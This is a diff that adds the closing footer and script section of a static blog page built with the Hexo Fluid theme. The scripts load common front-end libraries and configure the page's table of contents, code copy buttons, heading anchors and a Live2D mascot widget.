+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":250,"height":500,"hOffset":-30,"vOffset":-150},"mobile":{"show":true,"scale":0.5},"log":false});</script></body>
+</html>
